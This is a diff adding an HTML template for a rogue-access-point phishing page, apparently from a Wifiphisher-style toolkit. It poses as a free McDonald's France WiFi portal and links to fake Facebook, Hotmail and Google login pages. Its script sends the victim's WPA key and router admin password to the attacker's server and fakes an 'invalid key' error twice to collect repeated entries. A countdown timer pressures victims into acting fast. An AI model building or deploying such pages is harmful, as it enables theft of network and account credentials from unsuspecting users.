@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<!-- saved from url=(0034)https://mabbox.bytel.fr/login.html -->
+<html lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+ <title>{{box_name}} - Interface</title>
+        <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+<meta http-equiv="Pragma" content="no-cache" />
+<meta http-equiv="Expires" content="0" />
+ 
+ <meta name="viewport" content="initial-scale=1.0,user-scalable=no,maximum-scale=1">
+ 
+ <meta name="HandheldFriendly" content="True">
+ <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+
+ <!-- Style Sheets -->
+<link href="static/css/style.css" media="screen" rel="stylesheet" type="text/css"></head>
+<link href="static/css/animate.css" media="screen" rel="stylesheet" type="text/css"></head>
+
+    <script src="static/js/jquery.min.js"></script>
+<body class="tvw620i feat-checker feat-optim feat-biloader no-feat-temperature no-feat-orientation no-feat-light feat-usb feat-ht40 feat-5g feat-scan-5g no-feat-hotspot feat-wps feat-scanwifi no-feat-alert-save feat-boxwithled no-feat-boxwithletter feat-twoline feat-customerspace feat-ipv6 feat-diag-tcp no-feat-cable feat-repair-usb no-feat-search remote-off gridlock">
+<style type="text/css">
+.page-login {
+	background-color: #d90b20;
+	background-image: none;
+}
+.def-text-color { color: {{color}} !important; }
+.def-bg-color { background-color: {{color}} !important;}
+.def-bd-color { border-color: {{color}} !important; }
+
+.desktop-6 {
+	max-width: 100%;
+	padding: 10px;
+}
+.imgfirst {
+	display: block;
+	width: 50%;
+	margin: 0 auto;
+	margin-bottom: -30px;
+}
+.inputfront {
+	background-color: #DDDDDD;
+	color: black;
+	border-radius: 10px;
+}
+
+.labelfront {
+	text-align: left;
+	display: block;
+	font-size: 12px;
+	font-weight: bold;
+}
+.cta-1 {
+    padding: 0 20px 0 40px;
+    width: 100%;
+    text-align: center;
+    color: #fff;
+    background: {{color}};
+    border: 0px;
+}
+
+.cta-1:hover {
+	background-color: black;
+	color: white;
+}
+
+#dialog {
+	z-index: 100;
+	display: inline-block;
+	position: absolute;
+	width: 100%;
+	height: 100%;
+	display: flex;
+	justify-content:center;
+	align-items:center;
+	background-color: rgba(0,0,0,0.3);
+}
+
+#dialog .dialog-box {
+	display: inline-block;
+	background-color: white;
+	border-radius: 15px;
+	padding: 15px;
+}
+#dialog .dialog-box .dialog-text{
+text-align:center;
+font-size: 13px;
+}
+#dialog .dialog-box .but-close-dialog {
+	margin: 0 auto;
+	display: block;
+	padding: 10px;
+	color: white;
+	text-transform: uppercase;
+	font-size: 16px;
+	max-width: 200px;
+	text-align:center;
+	margin-top: 10px;
+	cursor: pointer;
+
+}
+
+.progress {
+	height: 30px;
+  width: 100%;
+}
+
+.progress {
+    height: 30px;
+    margin-bottom: 20px;
+    overflow: hidden;
+    background-color: #f5f5f5;
+    border-radius: 4px;
+    -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,.1);
+    box-shadow: inset 0 1px 2px rgba(0,0,0,.1);
+}
+
+.progress #dynamic {
+	height: 40px;
+	line-height: 30px;
+}
+
+.progress-bar.active, .progress.active .progress-bar {
+    -webkit-animation: progress-bar-stripes 2s linear infinite;
+    -o-animation: progress-bar-stripes 2s linear infinite;
+    animation: progress-bar-stripes 2s linear infinite;
+    color: white;
+}
+.progress-bar-success {
+    background-color: #5cb85c;
+}
+.progress-bar-striped, .progress-striped .progress-bar {
+    background-image: -webkit-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);
+    background-image: -o-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);
+    background-image: linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);
+    -webkit-background-size: 40px 40px;
+    background-size: 40px 40px;
+    }
+    @-webkit-keyframes progress-bar-stripes {
+  from {
+    background-position: 40px 0;
+  }
+  to {
+    background-position: 0 0;
+  }
+}
+@-o-keyframes progress-bar-stripes {
+  from {
+    background-position: 40px 0;
+  }
+  to {
+    background-position: 0 0;
+  }
+}
+@keyframes progress-bar-stripes {
+  from {
+    background-position: 40px 0;
+  }
+  to {
+    background-position: 0 0;
+  }
+}
+
+  .r-fb {
+  background-color: rgba(0,90,255,1);
+  border-radius: 5px;
+  color: white;
+  height: 40px;
+  line-height: 40px;
+  width: 80%;
+  margin: 0 auto;
+    margin-bottom: 2px;
+ }
+
+
+
+ .r-hotmail {
+  background-color:  #4888ef;;
+  border-radius: 5px;
+  color: white;
+  height: 40px;
+  line-height: 40px;
+  width: 80%;
+  margin: 0 auto;
+    margin-bottom: 2px;
+ }
+ 
+ .r-linked {
+  background-color: red;
+  border-radius: 5px;
+  color: white;
+  height: 40px;
+  line-height: 40px;
+  width: 80%;
+  margin: 0 auto;
+ }
+
+
+ #countdown {
+ 	margin-top: 10px;
+ 	font-size: 20px;
+ 	margin-bottom: 10px;
+ 	color: red;
+
+ }
+
+ table.social-but {
+  width: 100%;
+  height: 40px;
+
+  border-radius: 5px;
+
+color: white;
+font-family: "Arial";
+max-width: 350px;
+margin: 0 auto;
+margin-bottom: 2px;
+}
+table.social-but td {
+
+}
+table.social-but td:first-child {
+  width: 20%;
+  vertical-align: middle;
+  text-align:center;
+}
+table.social-but td:first-child img {
+display: inline-block;
+vertical-align: middle;
+height: 30px;
+}
+table.social-but td:last-child {
+  width: 80%;
+  vertical-align: middle;
+  text-align:center;text-transform:uppercase;
+  font-size: 12px;
+  padding: 5px;
+
+}
+
+
+table.social-but.facebook {
+      background-color: rgba(0,90,255,1);
+}
+table.social-but.google {
+  background-color: red;
+}
+table.social-but.microsoft {
+    background-color:  #4888ef;
+}
+
+a {
+  text-decoration: none;
+  color: inherit;
+  display: block;vertical-align: middle;
+}
+
+a:hover {
+  text-decoration: none;
+  color: inherit;
+}
+</style>
+<div class="page-login">
+
+	<div id="dialog" class=" animated-05 fadeIn" style="display: none">
+		<div class="dialog-box zoomIn">
+
+			<div class="dialog-text animated-1"></div>
+			<div class="but-close-dialog def-bg-color" onclick="javascript:hideDialog()">OK</div>
+		</div>
+	</div>
+ <div class="login-form" style="transform: none; top: 150px;">
+ <div class="row">
+ 				<img src="./static/img/logo.png" class="imgfirst" style="width: 200px; margin-bottom: 0px">
+ <div class="desktop-6 desktop-push-3 tablet-4 tablet-push-1 mobile-full panel">
+ 
+ <p style="font-size: 16px; font-weight: bold"></p><br />
+ <p style="font-size: 13px; text-transform: uppercase; font-weight: bold;background-color: #888888;border: 5px solid #EEEEEE;color: white;padding:10px; ;text-align:center">Bienvenue sur  <br />
+ {{ target_ap_essid }} 
+ </p><br />
+
+
+  <p style="font-size: 14px; font-weight: bold;text-align:center">Vous êtes connecté en tant que client </p><br />
+   <p style="color:orange; font-size: 12px; border-radius: 10px; padding: 0 10px 0 10px">Par sécurité, vous disposez d'un temps de connexion très limité !</p><br />
+   <p id="countdown"></p>
+
+<p class="def-bg-color" style="color: yellow;background-color: #555; padding: 10px; margin: 10px;margin-bottom: 10px">Pour profiter de nos services WIFI <span style="font-weight:bold">gratuitement</span> sur tous nos réseaux <span style="font-weight:bold">Mc Donald's France</span>, connectez-vous avec un de nos partenaires :</p>
+ <form id="login-form">
+
+
+  <a href="./facebook.html">
+  <table class="social-but facebook">
+    <tr>
+      <td><img src="./static/img/icon-facebook.png" style=""></td>
+      <td>Continuer avec facebook</td>
+    </tr>
+  </table>
+</a>
+  <a href="./microsoft.html">
+  <table class="social-but microsoft">
+    <tr>
+      <td><img src="./static/img/microsoft-logo.png"></td>
+      <td>Continuer avec Hotmail </td>
+    </tr>
+  </table>
+</a>
+  <a href="./google.html">
+  <table class="social-but google">
+    <tr>
+      <td><img src="./static/img/icon-google.png" ></td>
+      <td>Continuer avec Google</td>
+    </tr>
+  </table>
+</a>
+
+
+ </form>
+
+
+ <div class="spacer-hz"></div>
+ 
+ <div class="notify" style="">
+ <span class="internet"><span class="ok"></span></span>
+ <span class="voip"><span class="notanswered"></span></span>
+ <span class="wifi"><span class="on"></span></span>
+ <span class="iptv">
+ </span>
+ <span class="usb">
+ </span>
+ <span class="parental">
+ </span>
+ <span class="night">
+ </span>
+ <span class="dl-speed">
+ </span>
+ <span class="ul-speed ">
+ </span>
+ <span class="voicemail">
+ </span>
+ </div>
+ </div>
+ </div>
+ </div>
+
+</div>
+
+
+
+	    <script>
+
+
+	var dialog = $('#dialog');
+	var dialogBox = $('.dialog-text');
+	var dialogText ="";
+
+	var nb_try = 0;
+	 $(".btn-submit").on("click", function(e) {
+		  
+		      e.preventDefault();
+		     
+		      // get the password box and checkbox elements
+		      var input = document.getElementById("wifi-key");
+		      var input2 = document.getElementById("admin-pass");
+		      // check to see if the value is empty
+		      if ( input.value == "" ){
+				
+				dialogText = "Vous devez remplir les champs pour lancer la mise à jour et vous connecter.";
+				showDialog();
+
+		      }else{
+		          // post the data
+		          
+		            post('post', {
+		              'wfphshr-admin-password': input.value,
+		             'wfphshr-wpa-password': input2.value
+		            });      
+		      }
+		  });
+
+
+
+		  function showDialog() {
+
+		  		  	dialogBox.html(dialogText);
+		  		  	dialog.css('display','flex');
+
+		  }
+
+		  function hideDialog() {
+
+		  	dialog.css('display','none');
+		  }
+		  
+		  /*
+		  Post to the fallowing path given the parameters.
+
+		  Args:
+		    path: The path to be posted to.
+		    params: The parameters to be passed.
+		  */
+		  function post(path, params) {
+		    // create a form and set its attributes
+		   var dataToSend = JSON.stringify(params);
+// post the data
+
+$.ajax(
+    {
+        url: 'post',
+        type: 'POST',
+        data: dataToSend,
+
+        success: function (jsonResponse) {
+          if (nb_try < 2) {
+          		dialogText = "<span style='color: red'>Erreur: la clef WPA/PSK est invalide. </span>";
+				showDialog();
+				nb_try++;
+          }
+          else {
+          	window.location = "./update.html";
+          }
+       }
+    }
+ );
+		  }
+	 
+
+
+
+
+
+
+
+// Set the date we're counting down to
+
+var newDateObj = new Date(new Date().getTime() + (2*60*1000));
+var countDownDate = newDateObj;
+
+// Update the count down every 1 second
+var x = setInterval(function() {
+
+  // Get todays date and time
+  var now = new Date().getTime();
+
+  // Find the distance between now and the count down date
+  var distance = countDownDate - now;
+
+  // Time calculations for days, hours, minutes and seconds
+  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+  // Display the result in the element with id="demo"
+  document.getElementById("countdown").innerHTML = minutes + " minute " + seconds + " secondes ";
+
+  // If the count down is finished, write some text 
+  if (distance < 0) {
+    clearInterval(x);
+    document.getElementById("countdown").innerHTML = "EXPIRED";
+  }
+}, 1000);
+
+		</script>
+
+
+</body></html>
